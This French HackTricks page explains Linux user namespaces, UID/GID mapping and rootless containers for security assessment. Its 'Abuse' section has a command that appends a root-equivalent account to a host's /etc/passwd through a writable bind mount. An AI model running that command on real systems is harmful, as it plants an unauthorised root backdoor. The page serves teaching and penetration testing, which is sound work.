# User Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Aperçu

Le user namespace modifie la signification des identifiants utilisateur et groupe en permettant au kernel de mapper les identifiants vus à l’intérieur du namespace vers d’autres identifiants à l’extérieur. Il s’agit de l’une des protections modernes les plus importantes pour les containers, car elle s’attaque directement au principal problème historique des containers classiques : **root à l’intérieur du container était autrefois dangereusement proche de root sur le host**.

Avec les user namespaces, un processus peut s’exécuter avec l’UID 0 à l’intérieur du container tout en correspondant à une plage d’UID non privilégiés sur le host. Cela signifie que le processus peut se comporter comme root pour de nombreuses tâches à l’intérieur du container, tout en étant beaucoup moins puissant du point de vue du host. Cela ne résout pas tous les problèmes de sécurité des containers, mais modifie considérablement les conséquences d’une compromission du container.

## Fonctionnement

Un user namespace possède des fichiers de mapping tels que `/proc/self/uid_map` et `/proc/self/gid_map`, qui décrivent la manière dont les identifiants du namespace sont traduits en identifiants du parent. Si root à l’intérieur du namespace est mappé vers un UID non privilégié du host, les opérations qui nécessiteraient un véritable root sur le host n’ont alors simplement pas le même impact. C’est pourquoi les user namespaces sont au cœur des **rootless containers** et constituent l’une des principales différences entre les anciens defaults de containers rootful et les conceptions modernes fondées sur le least privilege.

Le point est subtil, mais crucial : root à l’intérieur du container n’est pas supprimé, il est **traduit**. Le processus continue de bénéficier localement d’un environnement similaire à celui de root, mais le host ne devrait pas le traiter comme un root complet.

## Lab

Un test manuel consiste à :
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Cela fait apparaître l’utilisateur actuel comme root à l’intérieur du namespace, tout en ne lui conférant pas les privilèges de root sur l’hôte à l’extérieur de celui-ci. C’est l’une des meilleures démonstrations simples pour comprendre pourquoi les user namespaces sont si précieux.

Dans les containers, vous pouvez comparer le mapping visible avec :
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
La sortie exacte dépend de l’utilisation par le moteur d’un remappage des user namespaces ou d’une configuration rootful plus traditionnelle.

Vous pouvez également lire le mapping depuis l’hôte avec :
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Utilisation en production

Rootless Podman est l’un des exemples les plus clairs d’espaces de noms utilisateur traités comme un mécanisme de sécurité de premier ordre. Rootless Docker en dépend également. La prise en charge de `userns-remap` par Docker améliore aussi la sécurité des déploiements avec daemon root, bien que, historiquement, de nombreux déploiements la laissent désactivée pour des raisons de compatibilité. La prise en charge des espaces de noms utilisateur par Kubernetes s’est améliorée, mais l’adoption et les valeurs par défaut varient selon le runtime, la distribution et la politique du cluster. Les systèmes Incus/LXC reposent également largement sur le décalage des UID/GID et les concepts d’idmapping.

La tendance générale est claire : les environnements qui utilisent sérieusement les espaces de noms utilisateur répondent généralement mieux à la question « que signifie réellement root dans un conteneur ? » que ceux qui ne les utilisent pas.

## Détails avancés du mapping

Lorsqu’un processus non privilégié écrit dans `uid_map` ou `gid_map`, le kernel applique des règles plus strictes que lorsqu’un processus privilégié de l’espace de noms parent effectue cette écriture. Seuls des mappings limités sont autorisés et, pour `gid_map`, le processus effectuant l’écriture doit généralement désactiver `setgroups(2)` au préalable :
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Ce détail est important, car il explique pourquoi la configuration d’un user namespace échoue parfois lors d’expérimentations rootless et pourquoi les runtimes ont besoin d’une logique helper soigneusement conçue autour de la délégation des UID/GID.

Une autre fonctionnalité avancée est l’**ID-mapped mount**. Au lieu de modifier la propriété sur le disque, un ID-mapped mount applique un mapping de user namespace à un mount, de sorte que la propriété apparaisse comme traduite depuis cette vue du mount. Cela est particulièrement pertinent dans les configurations rootless et les runtimes modernes, car cela permet d’utiliser des chemins partagés de l’hôte sans opérations récursives de `chown`. Du point de vue de la sécurité, cette fonctionnalité modifie la manière dont un bind mount apparaît comme étant accessible en écriture depuis l’intérieur du namespace, même si elle ne réécrit pas les métadonnées du système de fichiers sous-jacent.

Enfin, rappelez-vous que lorsqu’un processus crée ou rejoint un nouveau user namespace, il reçoit un ensemble complet de capabilities **à l’intérieur de ce namespace**. Cela ne signifie pas qu’il a soudainement acquis des privilèges globaux sur l’hôte. Cela signifie que ces capabilities peuvent être utilisées uniquement là où le modèle de namespace et les autres protections le permettent. C’est la raison pour laquelle `unshare -U` peut soudainement rendre possibles le mounting ou les opérations privilégiées locales au namespace sans faire directement disparaître la boundary root de l’hôte.

## Mauvaises configurations

La principale faiblesse consiste simplement à ne pas utiliser les user namespaces dans les environnements où cela serait possible. Si le root du container est mappé trop directement vers le root de l’hôte, les mounts hôte accessibles en écriture et les opérations privilégiées du kernel deviennent beaucoup plus dangereuses. Un autre problème consiste à forcer le partage du user namespace de l’hôte ou à désactiver le remapping pour des raisons de compatibilité sans mesurer à quel point cela modifie la trust boundary.

Les user namespaces doivent également être pris en compte avec le reste du modèle. Même lorsqu’ils sont actifs, une exposition étendue de l’API du runtime ou une configuration très faible du runtime peut toujours permettre une privilege escalation par d’autres chemins. Mais sans eux, de nombreuses anciennes classes de breakout deviennent beaucoup plus faciles à exploiter.

## Abuse

Si le container est rootful sans séparation par user namespace, un bind mount hôte accessible en écriture devient beaucoup plus dangereux, car le processus peut réellement écrire en tant que root de l’hôte. Les capabilities dangereuses deviennent également plus significatives. L’attaquant n’a plus besoin de lutter autant contre la boundary de traduction, car celle-ci est à peine présente.

La présence ou l’absence d’un user namespace doit être vérifiée rapidement lors de l’évaluation d’un chemin de container breakout. Cela ne répond pas à toutes les questions, mais montre immédiatement si le « root dans le container » a une pertinence directe sur l’hôte.

Le pattern d’abuse le plus pratique consiste à confirmer le mapping, puis à vérifier immédiatement si le contenu monté depuis l’hôte est accessible en écriture avec des privilèges pertinents sur l’hôte :
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Si le fichier est créé en tant que véritable root de l’hôte, l’isolation du user namespace est effectivement absente pour ce chemin. À ce stade, les abus classiques de fichiers de l’hôte deviennent réalistes :
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Une confirmation plus sûre lors d’une évaluation en cours consiste à écrire un marqueur inoffensif plutôt qu’à modifier des fichiers critiques :
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Ces vérifications sont importantes, car elles répondent rapidement à la véritable question : le root de ce container correspond-il suffisamment au root de l’hôte pour qu’un mount hôte accessible en écriture devienne immédiatement un chemin vers la compromission de l’hôte ?

### Exemple complet : récupérer des capabilities locales au namespace

Si seccomp autorise `unshare` et que l’environnement permet de créer un nouveau user namespace, le processus peut récupérer un ensemble complet de capabilities dans ce nouveau namespace :
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Ce n’est pas en soi une host escape. Cela importe parce que les user namespaces peuvent réactiver des actions privilégiées limitées au namespace, qui se combinent ensuite avec des mounts faibles, des kernels vulnérables ou des runtime surfaces mal exposées.

## Checks

Ces commandes visent à répondre à la question la plus importante de cette page : à quel utilisateur sur l’host correspond root à l’intérieur de ce container ?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
Ce qui est intéressant ici :

- Si le processus est UID 0 et que les maps montrent un mapping direct ou très proche de la root de l'hôte, le container est beaucoup plus dangereux.
- Si root est mappé vers une plage non privilégiée de l'hôte, il s'agit d'une base beaucoup plus sûre et cela indique généralement un véritable isolement par user namespace.
- Les fichiers de mapping sont plus utiles que `id` seul, car `id` n'affiche que l'identité locale au namespace.

Si le workload s'exécute avec l'UID 0 et que le mapping montre que cela correspond étroitement à la root de l'hôte, vous devez interpréter beaucoup plus strictement le reste des privilèges du container.
{{#include ../../../../../banners/hacktricks-training.md}}
